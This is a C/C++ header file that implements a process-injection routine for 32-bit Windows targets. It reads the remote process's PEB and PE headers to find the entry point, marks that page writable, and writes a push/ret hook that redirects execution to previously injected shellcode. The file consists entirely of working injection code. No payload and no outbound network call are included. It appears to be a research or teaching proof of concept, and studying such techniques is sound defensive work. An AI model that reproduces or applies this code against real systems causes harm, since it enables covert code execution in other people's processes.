#pragma once
#include <stdio.h>
#include "ntddk.h"
#include "pe_hdrs_helper.h"
#define PAGE_SIZE 0x1000

bool is_target_injectable(BYTE* hdrs_buf)
{
    if (hdrs_buf == NULL) return false;

    IMAGE_NT_HEADERS32 *inh = get_nt_hrds32(hdrs_buf);
    if (inh == NULL) return false;

    return true;
}

bool paste_shellcode_at_ep(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{
    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));

    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {
        printf("[ERROR] NtQueryInformationProcess failed\n");
        return false;
    }

    printf("PID = 0x%x\n", static_cast<int>(pbi.UniqueProcessId));

    LPCVOID ImageBase = 0;
    SIZE_T read_bytes = 0;
    if (!ReadProcessMemory(hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, sizeof(ImageBase), &read_bytes) && read_bytes != sizeof(ImageBase))
    {
        printf("[ERROR] ReadProcessMemory failed\n");
        return false;
    }
    printf("ImageBase = 0x%p\n", ImageBase);

    // read headers:
    BYTE hdrs_buf[PAGE_SIZE];
    if (!ReadProcessMemory(hProcess, ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return false;
    }
    if (!is_target_injectable(hdrs_buf)) {
        printf("[-] Cannot inject in this target!\n");
        return false;
    }

    // fetch Entry Point From headers
    IMAGE_NT_HEADERS32 *inh = get_nt_hrds32(hdrs_buf);
    if (inh == NULL) return false;

    IMAGE_OPTIONAL_HEADER32 opt_hdr = inh->OptionalHeader;
    DWORD ep_rva = opt_hdr.AddressOfEntryPoint;

    printf("Entry Point v: %x\n", ep_rva);
    printf("shellcode ptr: %p\n", remote_shellcode_ptr);

    //make a buffer to store the hook code:
    const SIZE_T kHookSize = 0x10;
    BYTE hook_buffer[kHookSize];
    memset(hook_buffer, 0xcc, kHookSize);

    //prepare the redirection:
    //address of the shellcode will be pushed on the stack and called via ret
    hook_buffer[0] = 0x68; //push
    hook_buffer[5] = 0xC3; //ret

    //for 32bit code:
    DWORD shellcode_addr = (DWORD)remote_shellcode_ptr;
    memcpy(hook_buffer + 1, &shellcode_addr, sizeof(shellcode_addr));

    //make a memory page containing Entry Point Writable:
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Virtual Protect Failed!\n");
        return false;
    }

    //paste the redirection at Entry Point:
    SIZE_T writen_bytes = 0;
    if (!WriteProcessMemory(hProcess, (LPBYTE)ImageBase + ep_rva, hook_buffer, sizeof(hook_buffer) , &writen_bytes))
    {
        printf("[-] WriteProcessMemory failed, err = %d\n", GetLastError());
        return false;
    }

    //restore the previous access rights at entry point:
    DWORD oldProtect2;
    if (!VirtualProtectEx(hProcess, (BYTE*)ImageBase + ep_rva, kHookSize, oldProtect, &oldProtect2)) {
        printf("Virtual Protect Failed!\n");
        return false;
    }
    return true;
}